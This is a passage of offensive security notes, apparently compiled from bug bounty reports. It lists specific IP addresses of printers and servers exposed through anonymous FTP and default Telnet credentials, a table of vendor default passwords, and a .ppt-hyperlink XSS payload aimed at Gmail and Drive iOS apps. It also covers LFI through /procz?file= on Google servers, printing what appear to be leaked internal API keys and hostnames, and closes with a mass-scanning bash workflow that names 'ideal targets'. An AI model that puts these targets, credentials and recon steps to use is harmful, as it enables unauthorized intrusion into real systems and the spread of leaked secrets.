- Full admin access to the printer → total control of the device's OS

**Documented IPs:**
- FTP servers: `136.63.199.164`, `136.62.67.57`
- Brother/HP printers with anonymous FTP: `136.61.146.5`, `136.62.53.228`, `136.63.72.2`, `23.228.141.115`
- Telnet with default creds: `136.63.72.2`, `23.228.141.115`

**Discovery methodology on ISPs/network infrastructure:**
- Identify the IP range of the target ASN: `whois -h whois.radb.net -- '-i origin AS<NUM>'` or search `*.googlefiber.net` on Shodan
- Scan ports 21 (FTP) and 23 (Telnet) in the range
- Try anonymous FTP: `anonymous/anonymous`
- Try Telnet with vendor defaults: Brother/HP → `admin/access`, `admin/admin`, `admin/` empty
- **Tool:** `nmap -p 21,23 --open <range> --script ftp-anon,telnet-encryption`

**Documented default credentials per vendor:**
| Vendor | Protocol | User | Password |
|---|---|---|---|
| Brother/HP printer | Telnet | admin | access |
| Huawei S7706 switch | HTTP | admin | admin@huawei.com |
| Generic FTP | FTP | anonymous | anonymous |

**Ideal targets:** ISPs with large CIDR ranges, corporate network infrastructure, printers and IoT devices exposed in tech companies' ASN ranges

---

### 5. XSS via PowerPoint 97-2003 in Gmail iOS app and Google Drive iOS app
**Target:** Gmail iOS app v5.0.180121, Google Drive iOS v4.2018.05202 | **Platform:** iPhone 6, iOS 11.2.5

**Same vector as Atlassian/Slack/Trello — confirmed in Google products:**
- Create `.ppt` file with hyperlink to `javascript:prompt(document.domain)`
- Must be saved as **"PowerPoint 97-2003 Presentation"** (.ppt) — not .pptx
- Send as email attachment to any Gmail account

**Gmail vector:**
1. Open the `.ppt` attachment in the Gmail iOS app
2. Click the hyperlink → XSS executed

**Google Drive vector:**
1. Copy the attachment to Google Drive from the email view
2. Open in the Google Drive iOS app → click the hyperlink → XSS executed

**Impact:** Stored XSS in Gmail and Google Drive iOS — an attacker can send the file to any victim and execute JS in the apps' context when opening the attachment

**Consolidated pattern — Office 97-2003 XSS in iOS apps (multiple resolutions):**
| Target | Format | Status |
|---|---|---|
| Atlassian Confluence | Word 97-2003 (.doc) | Resolved $300 |
| Slack files.slack.com | PowerPoint (.ppsx) | Not-applicable |
| Gmail iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |
| Google Drive iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |
| Trello iOS app | SVG | Resolved duplicate |

**Payload:** `javascript:prompt(document.domain)` as hyperlink URL in the document

---

### 2. LFI on Google prod server — DremelGateway as ROOT with exposed API keys
**Target:** Google prod server 34.83.45.88:7777, 34.83.45.88:2222 (DremelGateway) | **Criticality:** Very critical

**Vulnerable endpoints discovered:**
- `/labelaclz` → confirms the process runs as `root`. Info: `Owner Name: root`, `CDD file name: rpcacl_root_`.
- `/flagz` → exposes all configuration flags of the service, including API keys and internal domains.
- `/varz` → allows a full dump of the server variables.
- `/procz?file=/proc/self/cmdline` → **LFI** via unsanitized `?file=` parameter — reads arbitrary system files as root.

**Internal Google API keys exposed via `/flagz`:**
- `--dremel_api_key=AIzaSyAdMLkLUa1Xc184-BHZFYwZgJVUUYKsFNE`
- `--service_api_key=AIzaSyCXPqYgq2pLwmm1gbP-zGbcb_7hXhDLVDM`
- `--dremel_cloud_bigtable_request_api_key=AIzaSyC6bx_2nNWPebVTnHasmCB-DIN4Aptj74M`
- `--logs_front_door_service=logs-front-door-prod.stubbyconfig.google.com`

**Files readable via LFI (`/procz?file=`):**
```
/proc/self/environ    → process environment variables
/proc/self/cmdline    → startup arguments
/proc/self/maps       → process memory map
/proc/cpuinfo         → host CPU info
/proc/meminfo         → memory info
/proc/version         → kernel version
/proc/net/netstat     → network statistics
```

**Confirmation of prod/corp environment via `/flagz`:**
```
--cell_domain=.prod.google.com.
--census_tracing_collector_url=http://requestz.corp.google.com
--corplogin_loginservicenames=dremel.corp.google.com
--corplogin_server=https://login.corp.google.com
```

**Discovery technique:**
- Scanning IPs in Google ASN ranges on non-standard ports (2222, 7777, 8080, 9090, etc.)
- Internal Google services use standard debug endpoints: `/flagz`, `/procz`, `/varz`, `/statusz`, `/labelaclz`
- These endpoints expose internal configuration when the service becomes publicly accessible

**Ideal targets for similar techniques:**
- IPs of large corporate ASNs on non-standard ports (2222, 7777, 8888, 9999, etc.)
- Search on Shodan: `org:"Google" port:7777`, `port:2222`, `org:"Amazon" port:8080 /flagz`
- Exposed internal diagnostic endpoints: `/flagz`, `/varz`, `/statusz`, `/healthz`, `/debug`, `/admin`
- `?file=` parameter in any monitoring endpoint → try LFI with `/proc/self/environ`

---

### 4. Auth bypass + LFI on springboard.google.com — GWS production (Google Search servers)
**Target:** springboard.google.com/java/* | **User:** gws-prod | **Criticality:** Extreme

**Why it's more critical than the LFI on raw IPs:**
1. **Official google.com domain** (not exposed IP) — the service was published on a real Google subdomain
2. **gws-prod = Google Web Server production** — the servers that serve Google Search
3. **Auth bypass** — there was some form of authentication that was bypassed to access without credentials
4. **Load balancer** — each refresh on `/procz` pointed to a different backend (`pwit4`, `pwon26`, `pwgn3`, `pwmk25` — all in `*.prod.google.com`)

**Endpoints without authentication on springboard.google.com:**
```
/java/statusz      → GWS server state panel (FrameworkInfo)
/java/labelaclz    → owner: gws-prod, policy: OPEN
/java/procz        → full LFI without auth
/java/statusz?v=gcz&jfr#!/  → garbage collection stats
```

**LFI via /java/procz:**
```
https://springboard.google.com/java/procz?file=/proc/self/environ
https://springboard.google.com/java/procz?file=/proc/cpuinfo
https://springboard.google.com/java/procz?file=/proc/self/maps
https://springboard.google.com/java/procz?file=/proc/meminfo
https://springboard.google.com/java/procz?file=/proc/version
https://springboard.google.com/java/procz?file=/proc/net/netstat
```

**Internal Google infrastructure exposed via /java/statusz:**
- BNS address: `/bns/pw/borg/pw/bns/gws-prod/gws1.serve/242` — Borg Name Service (Google's internal orchestration system)
- Prod DNS: `pwit4.prod.google.com:9857`
- Build label: `gws_20190326-0_RC1`, changelist `240294144`
- Internal depot path: `//depot/branches/gws_release_branch/...`
- Prod server memory: 10.8GB / 18.1GB

**Discovery technique — auth bypass on exposed internal tools:**
- Look for subdomains of large companies that expose internal tools without real auth
- Subdomain keywords: `springboard`, `internal`, `corp`, `tools`, `dashboard`, `admin`, `monitor`
- The `/java/` prefix in the routes is an indicator of services based on Google's internal framework (Stubby/Borg)
- **Critical indicator:** if `/labelaclz` responds without auth → try `/procz?file=` immediately

**Lesson on load balancers:**
- When the LFI is behind a load balancer, each request can hit a different backend
- Make multiple requests to map how many servers are exposed
- The hostname changes in `/procz on <hostname>` with each refresh

---

### 3. LFI on Google server as ROOT — port 80 (same pattern, variant on standard port)
**Target:** Google prod server 34.94.39.119:80 | **Criticality:** Very critical

**Key differences vs previous report (34.83.45.88:7777/2222):**
- **Port 80** (standard HTTP) instead of 7777/2222 — confirms these internal services can be exposed on any port, including standard ones
- **LabelACL Policy: OPEN** (vs `OWNER_ONLY` previously) — more permissive policy, unrestricted access
- No `/flagz` reported — but same LFI via `/procz?file=` as root

**Pattern confirmed in multiple IPs (systematic finding in Google ASN):**
- 34.83.45.88:7777, 2222 → DremelGateway, policy OWNER_ONLY, with /flagz and internal API keys
- 34.94.39.119:80 → policy OPEN, standard port
- 35.227.157.158:80 → policy OPEN, same configuration (CDD: Tue Jul 2 13:30:04 2019)

**Implication:** The same CDD date (`Tue Jul 2 13:30:04 2019`) on multiple IPs indicates these are instances of the same service deployed in batch — scanning the full ASN range would probably reveal more identical instances.

**Methodological lesson:**
- Don't limit to non-standard ports — also scan ports 80/443 on target ASN IPs
- The `Default LabelACL Policy: OPEN` field indicates total exposure with no access restrictions
- When `/labelaclz` confirms `Owner Name: root` → the LFI reads files with maximum privileges
- **Mass recon workflow:**
  ```bash
  # Get Google ASN IP range
  whois -h whois.radb.net -- '-i origin AS15169' | grep route

  # Scan common ports looking for /labelaclz
  nmap -p 80,443,2222,7777,8080,8443,9090 <range> --open -oG output.txt

  # Verify endpoint on each active IP
  for ip in $(cat ips.txt); do curl -s "http://$ip/labelaclz" | grep "Owner Name" && echo $ip; done
  ```
